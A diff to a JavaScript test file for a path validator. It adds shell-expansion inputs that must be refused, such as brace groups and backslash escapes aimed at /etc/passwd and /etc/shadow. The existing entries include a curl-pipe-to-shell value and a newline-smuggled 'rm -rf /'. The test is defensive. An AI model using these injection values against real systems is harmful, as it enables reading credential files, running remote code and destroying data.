@@ -311,6 +311,23 @@ describe('state values that get substituted into a command or a path are constra
       '$(curl http://x/y.sh|sh)',
       'src/`id`.js',
       'src/ok.js\nrm -rf /',
+      // Brace groups, the fifth member found by review rather than by the rule.
+      // `{,/etc/passwd}` resolves HERE to a directory named `{,` and is
+      // contained, so it was kept and handed over with no flag — and bash
+      // expands it to the single word `/etc/passwd`. Demonstrated end to end
+      // against a real shell before this line was written.
+      '{,/etc/passwd}',
+      'src/{ok.js,/etc/shadow}',
+      // A sequence expression expands to paths that were never validated too,
+      // even when all of them land inside the workspace.
+      'src/a{1..3}.js',
+      // Backslash, the SIXTH member, found while fixing the fifth — which is
+      // the finding, not the entry. bash unescapes `\/` to `/`, so this denotes
+      // the absolute path an absolute path would have been refused for, and it
+      // survived every check above. Verified against a real shell: `head -c 40
+      // \/etc/passwd` printed `root:x:0:0:root:/root:/bin/bash`.
+      '\\/etc/passwd',
+      'src/\\x.js',
     ]) {
       const refs = taskRefsForAgent({ checkpoint_commit: null, files_changed: ['src/ok.js', entry] }, ws);
       assert.deepEqual(refs.files_changed, ['src/ok.js'], `kept ${JSON.stringify(entry)}`);
@@ -325,11 +342,15 @@ describe('state values that get substituted into a command or a path are constra
     mkdirSync(join(ws, 'weird'), { recursive: true });
     writeFileSync(join(ws, 'weird', 'a[1].js'), '//\n');
     writeFileSync(join(ws, 'weird', 'b*.js'), '//\n');
+    // A brace group bash does not expand. Only a group holding a comma or a
+    // `..` sequence produces a word other than itself, so refusing every `{`
+    // would cost this file for nothing.
+    writeFileSync(join(ws, 'weird', 'c{1}.js'), '//\n');
     const refs = taskRefsForAgent({
       checkpoint_commit: null,
-      files_changed: ['weird/a[1].js', 'weird/b*.js'],
+      files_changed: ['weird/a[1].js', 'weird/b*.js', 'weird/c{1}.js'],
     }, ws);
-    assert.deepEqual(refs.files_changed, ['weird/a[1].js', 'weird/b*.js']);
+    assert.deepEqual(refs.files_changed, ['weird/a[1].js', 'weird/b*.js', 'weird/c{1}.js']);
     assert.ok(!('files_changed_rejected' in refs));
   });
 
@@ -525,7 +546,7 @@ describe('state values that get substituted into a command or a path are constra
   // Whitespace is collapsed before comparing, so where a file wraps the line is
   // not part of the contract. Everything else is.
   const REJECTION_CAUSES = '会被展开成另一条路径的字符'
-    + '（`~user`、`$VAR`、`$(…)`、反引号、换行）**等** —— 举例不是穷举，'
+    + '（`~user`、`$VAR`、`$(…)`、反引号、换行、`{a,b}`）**等** —— 举例不是穷举，'
     + '判据是服务端能不能确认，不是它长得像不像坏东西。';
   const collapsed = (s) => s.replace(/\s+/g, '');
 
